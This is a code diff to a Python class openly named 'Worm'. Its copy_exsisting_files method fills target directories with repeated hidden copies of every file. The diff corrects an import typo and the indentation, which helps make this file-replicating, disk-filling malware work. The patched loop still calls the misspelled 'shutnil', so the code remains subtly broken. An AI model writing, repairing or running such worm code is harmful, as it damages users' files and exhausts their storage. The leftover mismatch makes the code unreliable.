@@ -2,7 +2,7 @@ import os
 import sys
 import time
 import win32con
-import shutnil
+import shutil
 
 class Worm:
     def __init__(self, path=None, target_dir_list=None, iteration=None):
@@ -46,13 +46,13 @@ class Worm:
     def copy_exsisting_files(self):
         for directory in self.target_dir_list:
             file_list_in_dir = os.listdir(directory)
-                for file in file_list_in_dir:
-                    abs_path = os.path.join(directory, file)
-                    if not abs_path.startswith(".") and not os.path.isdir(abs_path):
-                        source = abs_path
-                        for i in range(self.iteration):
-                            destination = os.path.join(directory, ("."+file+str(i)))
-                            shutnil.copyfile(source, destination)
+            for file in file_list_in_dir:
+                abs_path = os.path.join(directory, file)
+                if not abs_path.startswith(".") and not os.path.isdir(abs_path):
+                    source = abs_path
+                    for i in range(self.iteration):
+                        destination = os.path.join(directory, ("."+file+str(i)))
+                        shutnil.copyfile(source, destination)
     
     def start_worm_actions(self):
         self.list_directories(self.path)
